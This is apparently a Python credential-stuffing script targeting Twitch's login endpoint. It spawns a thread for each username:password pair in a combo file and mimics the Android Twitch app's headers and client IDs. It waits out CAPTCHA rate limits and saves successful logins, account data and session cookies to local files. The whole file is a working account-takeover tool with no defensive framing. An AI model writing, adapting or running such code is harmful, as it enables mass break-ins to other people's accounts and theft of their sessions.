import threading, time, requests


class Brute:
    def __init__(self):
        self.login = requests.post

        self.rates = 0
        self.hits = 0
        self.errors = 0

        self.combos = []

        for __ in open('combos.txt', 'r'):
            self.combos.append(__.rstrip())

        for _ in self.combos:
            threading.Thread(target=self.bruter, args=(_,)).start()

    def bruter(self, combo):

        loaded_set = combo

        username = loaded_set.split(":")[0]
        password = loaded_set.split(":")[1]

        DATA_V1 = {
            "username": username,
            "password": password,
            "client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko",
            "undelete_user": False
        }

        PARAMS_V1 = {
            "content-type": "application/json; charset=UTF-8",
            "host": "passport.twitch.tv",
            "connection": "Keep-Alive",
            "accept-encoding": "gzip",
            "client-id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
            "accept": "application/vnd.twitchtv.v3+json",
            "accept-language": "en-us",
            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G973N Build/PPR1.190810.011) tv.twitch.android.app/13.0.0/1300000"
        }

        response = self.login("https://passport.twitch.tv/login", json=DATA_V1, headers=PARAMS_V1)

        if "captcha_proof" in response.text:
            self.hits += 1
            print(loaded_set, file=open('hits.txt', 'a'))
            print(response.json(), file=open('logs.txt', 'a'))
            print(response.cookies, file=open('cookies.txt', 'a'))

        elif "Please complete the CAPTCHA correctly." in response.text:
            self.rates += 1; self.errors += 1
            time.sleep(30)
            self.bruter(loaded_set)

        elif "Incorrect username or password." in response.text:
            self.errors += 1

        else:
            self.errors += 1


Brute()
